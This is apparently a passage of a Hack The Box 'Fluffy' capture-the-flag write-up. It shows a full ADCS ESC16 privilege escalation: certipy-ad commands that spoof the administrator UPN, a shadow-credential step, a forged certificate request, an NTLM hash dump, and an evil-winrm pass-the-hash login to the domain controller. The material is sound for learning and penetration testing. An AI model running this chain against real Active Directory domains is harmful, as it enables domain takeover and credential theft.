So there are a few factors that must be in place for this vulnerability to be considered valid on the server. The first is that the server version must be updated to at least the May 2022 security updates or subsequent cumulative updates that include it so that the specific targeted extension `szOID_NTDS_CA_SECURITY_EXT` even exists within the ADCS architecture. We know contextually from our PDF that we got before that the IT department is actively patching for 2025 vulnerabilities and keeping systems mostly up-to-date. So it is likely that our target meets this condition.

![Pasted image 20261023180510.png](/img/user/CTFs/HTB/Images/Fluffy%20Images/Pasted%20image%2020261023180510.png)

```zsh
      },
      "User Specified SAN": "Disabled",
      "Request Disposition": "Issue",
      "Enforce Encryption for Requests": "Enabled",
      "Active Policy": "CertificateAuthority_MicrosoftDefault.Policy",
      "Disabled Extensions": [
        "1.3.6.1.4.1.311.25.2"
```
As you can see from our `certipy-ad` output from earlier we see that under "Disable Extensions" is the ID of the extension we are targeting with ESC16 meaning it does, in fact, exist on the machine and it looks like it has been disabled which is also what we need to manipulate our user's UPN to be `Administrator` effectively forging the request to the CA and getting credentials for the Administrator user.

#### Exploit Steps
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/fluffy/exploit]
└─$ certipy-ad account -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.129.232.88 -upn 'administrator' -user 'ca_svc' update
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'

```
The first thing we need to do is update the UPN of `ca_svc` to be `administrator` with certipy.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/fluffy/exploit]
└─$ faketime -f '2026-10-24 04:13:34.125431' certipy-ad shadow -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.129.232.88 -account 'ca_svc' auto -dc-host DC01.fluffy.htb
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'dac97c98749946d4b0b5cf27ba3f2171'
[*] Adding Key Credential with device ID 'dac97c98749946d4b0b5cf27ba3f2171' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID 'dac97c98749946d4b0b5cf27ba3f2171' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ca_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_svc.ccache'
File 'ca_svc.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
```
Next we generate a `ccache` credential file to authenticate via kerberos.

```zsh
export KRB5CCNAME=ca_svc.ccache  

┌──(kali㉿kali)-[~/CTF/HTB/fluffy/exploit]
└─$ faketime -f '2026-10-24 04:16:22.000310' certipy-ad req -k -dc-ip 10.129.232.88 -target 'DC01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via RPC
[*] Request ID is 21
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx
```
We then export that newly created ccache credential to our `KRB5CCNAME` variable to use with kerberos authentication and then call a certipy request using kerberos auth against the CA targeting the 'User' template and we successfully pull the pfx for `Administrator`.

##### Crucial Step
```zsh
└─$ certipy-ad account -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.129.232.88 -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'
```
Next you **must** revert your `ca_svc` user's UPN back to normal so that when we attempt to authenticate via the pfx it doesn't attempt to pull data on this user and pulls on the administrator instead.
##### Profit
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/fluffy/exploit]
└─$ faketime -f '2026-10-24 04:21:52.767164' certipy-ad auth -pfx administrator.pfx -username 'administrator' -dc-ip 10.129.232.88 -domain 'fluffy.htb'
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```
We then make the authentication request to the CA via certipy with our newly created `administrator.pfx` and we successfully dump the NTLM hash for the Administrator of the DC.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/fluffy/exploit]
└─$ evil-winrm -i 10.129.232.88 -u 'administrator' -H '8da83a3fa618b6e3a00e93f676c92a6e'
                                        
Evil-WinRM shell v4.1
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Info: Connection successful
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir ../Desktop


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/23/2026  11:00 PM             34 root.txt

```
We connect via Pass-the-Hash with `evil-winrm` and find `root.txt` sitting on the administrator's desktop. pwned.


## Final Thoughts
>[!Takeaways]
>- Whenever a situation hands you CVEs, always take a look at what they are and see if they're immediately relevant to your attack(s).
>- Whenever you have write access to a share, try and see if you can slinky or otherwise spoof on the network to intercept valid login traffic
>- if you get access to an account that has `GenericWrite` remember you have targeted kerberoasting **or** Shadow Credential attacks.
>- Whenever you gain control of any account related to ADCS always enumerate ADCS vulns with `certipy-ad find`
>- FAKETIME...for all things clock skew
>- ESC16 ftw

